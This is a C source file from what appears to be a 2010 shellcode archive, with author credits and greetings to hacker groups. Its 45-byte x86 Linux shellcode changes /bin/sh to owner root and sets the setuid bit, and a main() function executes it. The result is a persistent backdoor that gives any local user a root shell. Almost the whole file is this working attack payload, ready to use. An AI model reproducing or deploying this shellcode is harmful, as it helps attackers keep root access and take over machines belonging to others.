/*
Name   : 45 bytes give all user root access when execute /bin/sh x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, cruz3n and all devilzc0de crew
*/

#include <stdio.h>

char *shellcode=
		"\xeb\x1f"                    /* jmp    0x8048081 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0f"                    /* mov    $0xf,%al */
		"\x89\xdb"                    /* mov    %ebx,%ebx */
		"\x66\xb9\xed\x09"            /* mov    $0x9ed,%cx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xdc\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
		"\x2f"                        /* das     */
		"\x73\x68";                   /* jae    0x80480f5 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}